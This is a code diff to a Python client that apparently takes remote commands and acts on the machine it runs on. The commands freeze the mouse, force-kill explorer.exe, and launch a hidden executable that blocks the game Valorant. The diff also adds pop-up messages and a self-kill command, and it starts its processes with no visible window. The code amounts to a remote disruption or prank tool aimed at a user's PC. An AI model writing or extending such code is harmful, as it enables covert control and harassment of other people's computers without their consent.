@@ -1,16 +1,17 @@
 from implementations import *
 
+import threading
 import subprocess
 import os
 import sys
 
-commandsWithArgs = ["CALCULATOR", "IMAGE"]
+commandsWithArgs = ["CALCULATOR", "IMAGE", "TEXT"]
 image_url = "https://res.cloudinary.com/dnkpzafxp/image/upload/image_jtpkzq.png"
 
-def handle_message(msg, block_exe, state, startupinfo, creationflags):
-    if msg == "PONG":
-        return
+app = QtWidgets.QApplication(sys.argv)
+dispatcher = MessageDispatcher()
 
+def handle_message(msg, block_exe, valorantblock_exe, state, startupinfo, creationflags):
     parts = msg.split("|")
     command = parts[0]
     arg1 = parts[1] if len(parts) > 1 else None
@@ -24,7 +25,7 @@ def handle_message(msg, block_exe, state, startupinfo, creationflags):
     if command == "FREEZE_MOUSE":
         if state["mouse"] is None or state["mouse"].poll() is not None:
             state["mouse"] = subprocess.Popen(
-                [block_exe, "FREEZE_MOUSE"],
+                [valorantblock_exe],
                 creationflags=subprocess.CREATE_NO_WINDOW,
                 startupinfo=startupinfo
             )
@@ -74,6 +75,28 @@ def handle_message(msg, block_exe, state, startupinfo, creationflags):
 
     elif command == "COOK_PC_UI":
         os.system("taskkill /f /im explorer.exe")
-        
+
+    elif command == "BLOCK_VALORANT":
+        if state["valorant"] is None or state["valorant"].poll() is not None:
+            state["valorant"] = subprocess.Popen(
+                [block_exe, "BLOCK_VALORANT"],
+                creationflags=subprocess.CREATE_NO_WINDOW,
+                startupinfo=startupinfo
+            )
+
+    elif command == "UNBLOCK_VALORANT":
+        if state["valorant"] and state["valorant"].poll() is None:
+            state["valorant"].terminate()
+            state["valorant"] = None
+
+    elif "TEXT_" in command:
+        # TEXT_(text)|(opt secs)
+        argspc = msg.split("_")
+
+        if len(argspc) > 2 and argspc[2].isdigit():
+            dispatcher.show_message.emit(argspc[1], int(argspc[2]))
+        else:
+            dispatcher.show_message.emit(argspc[1], 5)
+
     elif command == "BYE":
         os.kill(os.getpid(), 9)
